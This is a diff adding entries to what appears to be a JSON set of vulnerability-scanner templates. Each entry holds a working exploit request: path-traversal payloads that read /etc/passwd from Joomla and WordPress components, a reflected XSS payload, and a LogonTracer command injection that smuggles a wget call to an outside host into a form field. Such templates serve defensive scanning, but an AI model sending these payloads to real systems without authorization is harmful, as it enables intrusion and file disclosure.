@@ -275,6 +275,40 @@
       ]
     },
     {
+      "id": "CVE-2008-4764",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the eXtplorer module (com_extplorer) 2.0.0 RC2 and earlier in Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the dir parameter in a show_error action.",
+        "name": "Joomla! Component com_extplorer 2.0.0 RC2 - Directory Traversal",
+        "reference": "- https://www.exploit-db.com/exploits/5435\n- https://www.cvedetails.com/cve/CVE-2008-4764\n",
+        "severity": "high",
+        "tags": "cve,cve2008,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_extplorer&action=show_error&dir=..%2F..%2F..%2F%2F..%2F..%2Fetc%2Fpasswd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2008-6668",
       "info": {
         "author": "geeknik",
@@ -553,6 +587,74 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wgarcmin.cgi?NEXTPAGE=D&ID=1&DOC=../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1979",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the Affiliate Datafeeds (com_datafeeds) component build 880 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+        "name": "Joomla! Component Affiliate Datafeeds 880 - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/12088\n- https://www.cvedetails.com/cve/CVE-2010-1979\n",
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_datafeeds&controller=../../../../../../../../../../etc/passwd%00"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2010-1983",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the redTWITTER (com_redtwitter) component 1.0.x including 1.0b11 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the view parameter to index.php",
+        "name": "Joomla! Component redTWITTER 1.0 - Local File Inclusion",
+        "reference": "- https://www.exploit-db.com/exploits/12055\n- https://www.cvedetails.com/cve/CVE-2010-1983\n",
+        "severity": "high",
+        "tags": "cve,cve2010,joomla,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?option=com_redtwitter&view=../../../../../../../../../../../../../../../etc/passwd%00"
           ]
         }
       ]
@@ -2692,6 +2794,40 @@
       ]
     },
     {
+      "id": "CVE-2014-4940",
+      "info": {
+        "author": "daffainfo",
+        "description": "Multiple directory traversal vulnerabilities in Tera Charts (tera-charts) plugin 0.1 for WordPress allow remote attackers to read arbitrary files via a .. (dot dot) in the fn parameter to (1) charts/treemap.php or (2) charts/zoomabletreemap.php.",
+        "name": "WordPress Plugin Tera Charts - Directory Traversal",
+        "reference": "https://www.cvedetails.com/cve/CVE-2014-4940",
+        "severity": "high",
+        "tags": "cve,cve2014,wordpress,wp-plugin,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/tera-charts/charts/zoomabletreemap.php?fn=../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2014-5368",
       "info": {
         "author": "daffainfo",
@@ -4136,6 +4272,47 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/new-year-firework/firework/index.php?text=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2016-1000146",
+      "info": {
+        "author": "daffainfo",
+        "name": "Pondol Form to Mail <= 1.1 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2016-1000146",
+        "severity": "medium",
+        "tags": "cve,cve2016,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/pondol-formmail/pages/admin-mail-info.php?itemid=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -7743,6 +7920,34 @@
           "method": "POST",
           "path": [
             "{{BaseURL}}/fcgi-bin/wgsetcgi"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-16167",
+      "info": {
+        "author": "gy741",
+        "description": "LogonTracer 1.2.0 and earlier allows remote attackers to execute arbitrary OS commands via unspecified vectors.",
+        "name": "LogonTracer 1.2.0 - Remote Code Execution (Unauthenticated)",
+        "reference": "- https://www.exploit-db.com/exploits/49918\n- https://nvd.nist.gov/vuln/detail/CVE-2018-16167\n",
+        "severity": "critical",
+        "tags": "cve,cve2018,logontracer,rce,oob"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /upload HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: python-requests/2.18.4\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nContent-Type: application/x-www-form-urlencoded\n\nlogtype=XML&timezone=1%3Bwget+http%3A%2F%2F{{interactsh-url}}%3B\n"
           ]
         }
       ]
